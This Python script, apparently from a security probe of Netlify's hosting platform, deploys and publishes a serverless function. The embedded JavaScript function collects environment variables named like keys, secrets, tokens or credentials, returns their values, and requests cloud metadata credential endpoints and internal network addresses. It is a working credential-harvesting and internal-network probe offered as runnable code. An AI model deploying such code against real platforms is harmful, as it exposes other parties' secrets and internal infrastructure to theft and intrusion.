# -*- coding: utf-8 -*-
"""Netlify:deploy + upload function + publish + invoke 探测
函数代码探测:环境变量/文件系统/metadata/内部网络
"""
import http.client, ssl, gzip, brotli, sys, json, zipfile, io
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import TOKEN_A, SITE_A

ctx = ssl.create_default_context()

def api(path, method='GET', body=None, raw_body=None, ctype='application/json', qs=''):
    conn = http.client.HTTPSConnection('api.netlify.com', context=ctx, timeout=60)
    h = {'User-Agent': 'Mozilla/5.0', 'Accept-Encoding': 'br, gzip', 'Accept': 'application/json',
         'Authorization': 'Bearer ' + TOKEN_A, 'Content-Type': ctype}
    payload = raw_body if raw_body is not None else (json.dumps(body).encode() if body is not None else None)
    conn.request(method, path + qs, body=payload, headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    conn.close()
    return st, raw

FN_CODE = r'''exports.handler = async (event, context) => {
  const out = { env: {}, net: {}, fs: [], meta: 'none' };
  try {
    for (const k of Object.keys(process.env)) {
      const v = process.env[k];
      if (/key|secret|token|pass|cred|auth|nfu_|npg_/i.test(k)) out.env[k] = v;
    }
    out.envCount = Object.keys(process.env).length;
  } catch (e) { out.envErr = String(e); }
  // 内网/metadata 探测
  const targets = [
    'http://169.254.169.254/latest/meta-data/',
    'http://169.254.170.2/v2/credentials',
    'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
    'http://10.0.0.1/', 'http://172.16.0.1/', 'http://192.168.0.1/',
    'http://localhost:8080/', 'http://127.0.0.1:8080/',
  ];
  const results = [];
  const test = async (u) => {
    try {
      const ctl = new AbortController();
      const t = setTimeout(() => ctl.abort(), 2500);
      const r = await fetch(u, { signal: ctl.signal, headers: { 'Metadata': 'true' } });
      clearTimeout(t);
      results.push(u + ' => ' + r.status + ' len=' + (await r.text()).length);
    } catch (e) { results.push(u + ' => ERR ' + String(e).slice(0, 60)); }
  };
  await Promise.all(targets.map(test));
  out.net = results;
  return { statusCode: 200, body: JSON.stringify(out) };
};
'''

# 1. 创建 deploy
s, raw = api('/api/v1/sites/%s/deploys' % SITE_A, method='POST', body={'title': 'fn-probe'})
print('create deploy:', s, raw[:200].decode('utf-8', 'ignore').replace('\n', ' '))
d = json.loads(raw)
DID = d.get('id')
print('deploy id:', DID, 'required_functions:', d.get('required_functions'), 'state:', d.get('state'))

# 2. zip 打包函数
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
    z.writestr('index.js', FN_CODE)
zb = buf.getvalue()
print('fn zip size:', len(zb))

# 3. 上传函数
s, raw = api('/api/v1/deploys/%s/functions/probe1' % DID, method='PUT', raw_body=zb,
             ctype='application/zip', qs='?runtime=js&size=%d' % len(zb))
print('upload fn:', s, raw[:200].decode('utf-8', 'ignore').replace('\n', ' '))

# 4. 发布
s, raw = api('/api/v1/sites/%s/deploys/%s' % (SITE_A, DID), method='PUT', body={'state': 'published'})
print('publish:', s, raw[:150].decode('utf-8', 'ignore').replace('\n', ' '))
dd = json.loads(raw) if s == 200 else {}
print('final state:', dd.get('state'), 'fn list:', dd.get('functions'))

# 5. 记录 deploy id 供后续调用
open(r'D:\scan\netlify_report\_js\net_fn_deploy.json', 'w').write(json.dumps({'deploy_id': DID}))
